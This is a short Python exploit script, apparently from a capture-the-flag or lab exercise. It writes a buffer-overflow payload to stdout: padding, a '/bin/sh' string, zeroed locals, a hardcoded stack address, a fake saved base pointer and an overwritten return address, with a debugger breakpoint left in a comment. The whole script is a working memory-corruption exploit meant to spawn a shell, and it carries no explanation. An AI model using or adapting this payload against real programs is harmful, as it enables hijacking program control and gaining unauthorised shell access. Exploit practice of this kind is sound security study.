#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'A'*2 + b'/bin/sh\x00') #buf
sys.stdout.buffer.write(b'\x00'*8) #c
sys.stdout.buffer.write(b'\x00'*8) #b
sys.stdout.buffer.write(0x7ffffff6e310.to_bytes(8, 'little')) #a
sys.stdout.buffer.write(b'A'*8) #rbp
sys.stdout.buffer.write(0x455050.to_bytes(8, 'little'))

#b *0x0000000000401e7f